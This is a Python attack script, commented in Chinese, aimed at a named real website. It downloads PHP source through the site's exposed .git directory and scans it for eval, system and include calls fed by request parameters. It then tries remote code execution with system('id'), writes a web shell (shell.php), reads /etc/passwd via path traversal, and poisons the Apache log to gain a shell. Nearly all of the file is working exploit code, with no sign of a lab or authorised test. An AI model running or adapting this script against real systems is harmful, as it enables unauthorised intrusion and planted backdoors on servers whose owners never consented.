#!/usr/bin/env python3
import requests
import zlib
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"

# 递归下载所有tree对象找PHP文件
def download_tree(tree_hash, path=""):
    tree_path = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    resp = requests.get(url + tree_path, verify=False, timeout=10)
    if resp.status_code != 200:
        return []
    
    tree_data = zlib.decompress(resp.content)
    null1 = tree_data.find(b'\0')
    if null1 == -1:
        return []
    
    pos = null1 + 1
    files = []
    
    while pos < len(tree_data):
        null2 = tree_data.find(b'\0', pos)
        if null2 == -1 or null2 + 21 > len(tree_data):
            break
        
        mode_name = tree_data[pos:null2]
        parts = mode_name.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            hash_hex = tree_data[null2+1:null2+21].hex()
            full_path = f"{path}/{filename}" if path else filename
            
            if mode == '40000':  # 目录
                # 递归下载
                sub_files = download_tree(hash_hex, full_path)
                files.extend(sub_files)
            elif filename.endswith('.php'):
                files.append((full_path, hash_hex))
            pos = null2 + 21
        else:
            break
    
    return files

print("[*] 下载所有PHP文件...")
commit_hash = "28a9d8b08195ac9eae7fa12afca9c5141d0ab151"
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"

php_files = download_tree(tree_hash)
print(f"[+] 找到 {len(php_files)} 个PHP文件")

# 下载并分析每个PHP文件
for file_path, file_hash in php_files[:20]:  # 限制前20个
    print(f"\n[*] 分析: {file_path}")
    blob_path = f"/.git/objects/{file_hash[:2]}/{file_hash[2:]}"
    resp = requests.get(url + blob_path, verify=False, timeout=10)
    if resp.status_code == 200:
        blob_data = zlib.decompress(resp.content)
        null_blob = blob_data.find(b'\0')
        if null_blob != -1:
            content = blob_data[null_blob+1:].decode('utf-8', errors='ignore')
            
            # 检查危险函数
            if "eval" in content.lower():
                print(f"  [+] 包含eval函数!")
                # 查找参数
                get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content)
                post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content)
                all_params = list(set(get_params + post_params))
                
                if all_params:
                    print(f"  参数: {all_params}")
                    # 尝试RCE
                    web_path = file_path.lstrip('/')
                    for param in all_params[:3]:
                        test_url = f"{url}{web_path}?{param}=system('id');"
                        resp2 = requests.get(test_url, verify=False, timeout=5)
                        if "uid=" in resp2.text:
                            print(f"  [+] RCE成功: {test_url}")
                            # 写入shell
                            shell_payload = f"{param}=file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                            requests.get(f"{url}{web_path}?{shell_payload}", verify=False, timeout=5)
                            test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                            if "uid=" in test_shell.text:
                                print(f"\n[+] Shell获取成功: {url}/shell.php?c=id")
                                exit(0)
            
            if "system" in content.lower() and "$_GET" in content:
                print(f"  [+] 包含system函数!")
                # 查找参数
                get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content)
                if get_params:
                    web_path = file_path.lstrip('/')
                    for param in get_params[:2]:
                        test_url = f"{url}{web_path}?{param}=id"
                        resp2 = requests.get(test_url, verify=False, timeout=5)
                        if "uid=" in resp2.text:
                            print(f"  [+] 命令执行成功: {test_url}")
                            # 写入shell
                            shell_cmd = f"echo '<?php system($_GET[c]); ?>' > shell.php"
                            shell_url = f"{url}{web_path}?{param}={shell_cmd}"
                            requests.get(shell_url, verify=False, timeout=5)
                            test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                            if "uid=" in test_shell.text:
                                print(f"\n[+] Shell获取成功: {url}/shell.php?c=id")
                                exit(0)
            
            # 检查文件包含漏洞
            if "include" in content or "require" in content:
                if "$_GET" in content or "$_POST" in content:
                    print(f"  [+] 可能存在文件包含漏洞")
                    web_path = file_path.lstrip('/')
                    # 尝试包含/etc/passwd
                    test_url = f"{url}{web_path}?file=../../../../etc/passwd"
                    resp2 = requests.get(test_url, verify=False, timeout=5)
                    if "root:" in resp2.text:
                        print(f"  [+] 文件包含成功: {test_url}")
                        # 尝试包含日志文件写入shell
                        log_url = f"{url}{web_path}?file=../../../../var/log/apache2/access.log"
                        # 先访问写入PHP代码到日志
                        requests.get(f"{url}{web_path}?file=<?php system($_GET[c]); ?>", verify=False, timeout=5)
                        # 然后包含日志
                        shell_resp = requests.get(log_url + "?c=id", verify=False, timeout=5)
                        if "uid=" in shell_resp.text:
                            print(f"  [+] 通过日志文件获取shell成功")
                            exit(0)

print("\n[-] 未找到可利用漏洞")
